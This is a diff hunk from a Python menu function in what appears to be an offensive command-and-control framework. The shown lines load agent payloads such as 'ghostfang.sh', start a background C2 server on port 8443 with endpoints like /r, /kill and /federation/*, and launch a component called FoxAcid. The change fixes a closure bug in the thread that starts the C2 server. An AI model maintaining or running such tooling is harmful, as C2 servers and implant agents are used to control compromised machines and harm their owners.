@@ -3281,7 +3281,7 @@ def menu():
                 agents = {"default": _read(AGENT, "# agent file missing"),
                           "linux":   _read("ghostfang.sh", "# run posixagent first"),
                           "mac":     _read("ghostfang.sh", "# run posixagent first")}
-                threading.Thread(target=lambda: run_c2(make_c2(agents)), daemon=True).start()
+                threading.Thread(target=lambda a=agents: run_c2(make_c2(a)), daemon=True).start()
                 print("C2 on :8443 (waitress WSGI, background) — /s, /r, /ai, /dash, /kill, /federation/*")
             elif ch == "20":
                 threading.Thread(target=FoxAcid().serve, daemon=True).start()
